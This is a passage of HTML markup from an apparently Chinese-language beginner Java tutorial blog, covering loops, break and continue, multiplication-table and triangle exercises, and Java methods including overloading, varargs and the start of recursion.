      <span class="keyword">while</span>(i&lt;<span class="number">100</span>)&#123;</span><br><span class="line">             i++;</span><br><span class="line">             System.out.println(i);</span><br><span class="line">         &#125;</span><br><span class="line"><span class="comment">//        System.out.println();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WhileDemo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            sum=sum+i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h4><p>对于while语句而言，如果不满足条件，则不能进入循环。但有时候我们需要即使不满足条件也至少执行一次。<br>do…while循环和while循环相似，不同的是，do…while循环至少会执行一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">do &#123;</span><br><span class="line">//代码语句</span><br><span class="line">&#125;while(布尔表达式);</span><br></pre></td></tr></table></figure><p>While和do-While的区别:<br>while先判断后执行。dowhile是先执行后判断!<br>Do…while总是保证循环体会被至少执行一次!这是他们的主要差别。</p><h4 id="For循环"><a href="#For循环" class="headerlink" title="For循环"></a>For循环</h4><p>虽然所有循环结构都可以用while或者do…while表示，但Java提供了另一种语句——fo循环，使一些循环结构变得更加简单。<br>for循环语句是支持迭代的一种通用结构，是最有效、最灵活的循环结构。for循环执行的次数是在执行前就确定的。语法格式如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(初始化;布尔表达式;更新)&#123;</span><br><span class="line">//代码语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>100.for</strong>接回车自动生成for循环语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>;<span class="comment">//初始化条件</span></span><br><span class="line">        <span class="keyword">while</span>(a&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            a+=<span class="number">2</span>;<span class="comment">//迭代</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;while循环结束&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;for循环结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">/*</span></span><br><span class="line"><span class="comment">    关于 for循环有以下几点说明:</span></span><br><span class="line"><span class="comment">        最先执行初始化步骤。可以声明一种类型，但可初始化一个或多个循环控制变量，也可以是空语句。</span></span><br><span class="line"><span class="comment">        然后，检测布尔表达式的值。如果为 true，循环体被执行。如果为false，循环终止，开始执行循环体后面的语句。执行一次循环后，更新循环控制变量(迭代因子控制循环变量的增减)。</span></span><br><span class="line"><span class="comment">        再次检测布尔表达式。循环执行上面的过程。</span></span><br><span class="line"><span class="comment">        */</span></span><br></pre></td></tr></table></figure><p>计算0到100之间所有奇数和偶数的和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> oddsum=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> evensum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">                oddsum+=i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                evensum+=i;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(oddsum);</span><br><span class="line">        System.out.println(evensum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用while循环或for循环输出1-1000之间能被5整除的数，并每行输出3个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(i+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i%(<span class="number">5</span>*<span class="number">3</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="打印九九乘法表"><a href="#打印九九乘法表" class="headerlink" title="打印九九乘法表"></a>打印九九乘法表</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;=<span class="number">9</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= j; i++) &#123;</span><br><span class="line">                System.out.print(j+<span class="string">&quot;*&quot;</span>+i+<span class="string">&quot;=&quot;</span>+(j*i)+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####增强for循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(声明语句：表达式)&#123;</span><br><span class="line"></span><br><span class="line">//代码句子</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>声明语句:声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。</p><p>表达式:表达式是要访问的数组名，或者是返回值为数组的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForDemo05</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> []numbers=&#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>&#125;;<span class="comment">//定义了一个数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.println(numbers[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println (<span class="string">&quot;---------分割线--------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历数组的元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x:numbers)&#123;</span><br><span class="line">            System.out.println(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="break-continue"><a href="#break-continue" class="headerlink" title="break&amp;&amp;continue"></a>break&amp;&amp;continue</h4><p>break在任何循环语句的主体部分，均可用break控制循环的流程。break用于强行退出循环，<strong>不执行循环中剩余的语句</strong>。(break语句也在switch语句中使用)</p><p>continue语句用在循环语句体中，用于<strong>终止某次循环过程</strong>，即跳过循环体中尚未执行的语句，接着进行下一次是否执行循环的判定。<br><strong>关于goto关键字</strong><br>goto关键字很早就在程序设计语言中出现。尽管goto仍是Java的一个保留字，但并未在语言中得到正式使用;Java没有goto。然而，在break和continue这两个关键字的身上，我们仍然能看出一些goto的影子—带标签的break和continue.<br>“标签”是指后面跟一个冒号的标识符，例如:</p><p>对Java来说唯一用到标签的地方是在循环语句之前。而在循环之前设置标签的唯一理由是:我们希望在其中嵌套另-个循环，由于break和continue关键字通常只中断当前循环，但若随同标签使用，它们就会中断到存在标签的地方。</p><h4 id="打印三角形"><a href="#打印三角形" class="headerlink" title="打印三角形"></a>打印三角形</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//打印三角形  5行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">5</span>; j&gt;=i ;j--) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java方法"><a href="#Java方法" class="headerlink" title="Java方法"></a>Java方法</h2><p>什么是方法？</p><p>Java方法是语句的集合，它们在一起执行一个功能。<br>方法是解决一类问题的步骤的有序组合<br>方法包含于类或对象中<br>◆方法在程序中被创建，在其他地方被引用<br>设计方法的原则:方法的本意是功能块，就是实现某个功能的语句块的集合。我们设计方法的时候，最好保持方法的原子性，就是一个方法只完成1个功能，这样利于我们后期的扩展。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        int sum = add(1,2);</span></span><br><span class="line"><span class="comment">//        System.out.println(sum);</span></span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//加法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.print(i + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i % (<span class="number">5</span> * <span class="number">3</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="方法的定义"><a href="#方法的定义" class="headerlink" title="方法的定义"></a>方法的定义</h4><p>Java的方法类似于其它语言的函数，是一段用来完成特定功能的代码片段，一般情况下，定义一个方法包含以下语法:<br>方法包含一个方法头和一个方法体。下面是一个方法的所有部分:<br>修饰符:修饰符，这是可选的，告诉编译器如何调用该方法。定义了该方法的访问类型。<br>返回值类型∶方法可能会返回值。returnValueType是方法返回值的数据类型。有些方法执行所需的操作，但没有返回值。在这种情况下，returnValueType是关键字void。<br>方法名:是方法的实际名称。方法名和参数表共同构成方法签名。<br>参数类型:参数像是一个占位符。当方法被调用时，传递值给参数。这个值被称为实参或变量。参数列表是指方法的参数类型、顺序和参数的个数。参数是可选的，方法可以不包含任何参数。<br>形式参数:在方法被调用时用于接收外界输入的数据。</p><p>实参:调用方法时实际传给方法的数据。<br>方法体:方法体包含具体的语句，定义该方法的功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修饰符返回值类型方法名(参数类型参数名)&#123;</span><br><span class="line">。。。</span><br><span class="line">方法体</span><br><span class="line">。。。</span><br><span class="line"><span class="keyword">return</span> 返回值；&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> max=max(<span class="number">10</span>,<span class="number">10</span>);</span><br><span class="line">        System.out.println(max);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> num1,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">        <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>java都是值传递</strong></p><h4 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h4><blockquote><p>重截就是在一个类中有相同的函数名称，但形参不同的函数。<br>方法的重载的规则:<br>方法名称必须相同。<br>参数列表必须不同(个数不同、或类型不同、参数排列顺序不同等)。方法的返回类型可以相同也可以不相同。<br>仅仅返回类型不同不足以成为方法的重载。<br>实现理论:<br>方法名称相同时，编译器会根据调用方法的参数个数、参数类型等去逐个匹配，以选择对应的方法，如果匹配失败，则编译器报错。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> max=max(<span class="number">30.0</span>,<span class="number">10.0</span>,<span class="number">90.0</span>);</span><br><span class="line">        System.out.println(max);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> num1,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">        <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">max</span><span class="params">(<span class="type">double</span> num1,<span class="type">double</span> num2)</span>&#123;</span><br><span class="line">        <span class="type">double</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">max</span><span class="params">(<span class="type">double</span> num1,<span class="type">double</span> num2,<span class="type">double</span> num3)</span>&#123;</span><br><span class="line">        <span class="type">double</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num3&gt;num2+num1)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;哇哦！这个数也太大了吧！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h4><h4 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h4><p>JDK 1.5开始,Java支持传递同类型的可变参数给一个方法。在方法声明中，在指定参数类型后加一个省略号(.….)。<br>一个方法中只能指定一个可变参数，它必须是方法的最后一个参数。任何普通的参数必须在它之前声明。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Demo04 demo04=<span class="keyword">new</span> <span class="title class_">Demo04</span>();</span><br><span class="line">        demo04.test(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span>...i)</span>&#123;</span><br><span class="line">        System.out.println(i[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">1</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">2</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">3</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">4</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><blockquote><p>A方法调用B方法，我们很容易理解!<br>递归就是:A方法调用A方法!就是自己调用自己<br>利用递归可以用简单的程序来解决一些复杂的问题。它通常把一个大型复杂的问题层层转化为一个与原问题相似的规模较小的问题来求解，递归策略只需少量的程序就可描述出解题过程所需要的多次重复计算，大大地减少了程序的代码量。递归的能力在于用有限的语句来定义对象的无限集合。<br>递归结构包括两个部分:<br>递归头:什么时候不调用自身方法。如果没有头，将陷入死循环。递归体:什么时候需要调用自身方法。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(f(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span 